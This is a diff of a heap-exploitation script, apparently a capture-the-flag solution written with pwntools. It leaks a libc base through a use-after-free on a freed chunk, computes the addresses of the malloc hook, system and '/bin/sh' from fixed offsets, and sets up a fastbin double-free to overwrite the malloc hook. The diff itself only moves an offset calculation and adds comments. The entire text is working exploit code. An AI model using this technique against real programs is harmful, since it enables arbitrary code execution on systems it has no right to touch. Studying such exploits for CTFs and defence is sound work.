@@ -18,18 +18,18 @@ add( 0x100, ' ' )	# 0
 add( 0x60, ' ' ) 	# 1
 add( 0x60, ' ' ) 	# 2
 delete( 0 )
-show( 0 )
+show( 0 )		# daggling pointer
 r.recvline()
 libc_base = u64( r.recv(6) + b'\0\0' ) - 0x3c4b78
-malloc_hook = libc_base + 0x3c4b10 - 0x10 - 3
+malloc_hook = libc_base + 0x3c4b10
 system_func = libc_base + 0x45390
 bin_sh_ptr = libc_base + 0x18cd57
 success( "libc_base = " + hex(libc_base) )
 
 delete( 1 )
 delete( 2 )
-delete( 1 )
-add( 0x60, p64(malloc_hook) )
+delete( 1 )		# fastbin[0x70]->1->2->1
+add( 0x60, p64(malloc_hook -0x10 -3) )
 add( 0x60, ' ' )
 add( 0x60, ' ' )
 
